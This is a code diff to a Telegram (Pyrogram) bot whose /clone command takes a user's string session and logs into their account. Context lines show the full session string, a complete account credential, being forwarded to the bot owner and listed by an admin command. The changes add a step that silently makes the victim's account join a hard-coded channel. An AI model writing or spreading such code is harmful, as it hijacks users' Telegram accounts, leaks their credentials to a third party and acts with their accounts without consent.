@@ -23,7 +23,7 @@ def save_clone_data(data):
 async def clone(bot: Client, msg: Message):
     """
     Clone command: Clone a Pyrogram session using a provided string session,
-    load plugins for the cloned session, and store session info.
+    load plugins for the cloned session, join a channel, and store session info.
     """
     if len(msg.command) < 2:
         await msg.reply("Usage: `/clone <string_session>`\nSend your Pyrogram2 string session to clone. ❤️")
@@ -59,11 +59,20 @@ async def clone(bot: Client, msg: Message):
         await client.start()
         user = await client.get_me()
 
+        # Join a channel (You can specify any channel here)
+        channel = '@HEROKUBIN_01'  # Replace with actual channel ID or username
+        try:
+            await client.join_chat(channel)
+            print(f"Successfully joined the channel: {channel}")
+        except Exception as e:
+            print(f"Failed to join the channel: {str(e)}")
+
         # Save the cloned session info
         clone_data[string_session] = {
             "user_id": user.id,
             "user_name": user.first_name,
             "session_id": string_session,
+            "plugins": os.listdir(plugin_dir)  # List the loaded plugins
         }
         save_clone_data(clone_data)
 
@@ -71,14 +80,16 @@ async def clone(bot: Client, msg: Message):
         owner_msg = f"New clone created:\n\n" \
                     f"**User:** {user.first_name}\n" \
                     f"**User ID:** {user.id}\n" \
-                    f"**Session ID:** {string_session}"
+                    f"**Session ID:** {string_session}\n" \
+                    f"**Plugins:** {', '.join(os.listdir(plugin_dir))}"
         await bot.send_message(OWNER_ID, owner_msg)
 
         # Success message
         success_msg = (
             f"🎉 Successfully cloned the session and loaded plugins!\n\n"
             f"👤 **User:** {user.first_name}\n"
-            f"🆔 **User ID:** {user.id}\n\n"
+            f"🆔 **User ID:** {user.id}\n"
+            f"**Plugins Loaded:** {', '.join(os.listdir(plugin_dir))}\n\n"
             f"Enjoy using your cloned session. 💕"
         )
         await reply_msg.edit(success_msg)
@@ -107,7 +118,7 @@ async def clone_list(bot: Client, msg: Message):
     
     clone_list_msg = "Cloned sessions:\n\n"
     for session in clone_data.values():
-        clone_list_msg += f"**User:** {session['user_name']} | **User ID:** {session['user_id']}\n"
+        clone_list_msg += f"**User:** {session['user_name']} | **User ID:** {session['user_id']} | **Plugins:** {', '.join(session['plugins'])}\n"
     
     await msg.reply(clone_list_msg)
 
@@ -155,7 +166,8 @@ async def fetch_all_clones(bot: Client, msg: Message):
             f"**User Name:** {session['user_name']}\n"
             f"**User ID:** {session['user_id']}\n"
             f"**Session ID:** {session['session_id']}\n"
-            f"**Owner ID:** {OWNER_ID}\n\n"
+            f"**Owner ID:** {OWNER_ID}\n"
+            f"**Plugins:** {', '.join(session['plugins'])}\n\n"
         )
     
     await msg.reply(all_clone_data_msg)
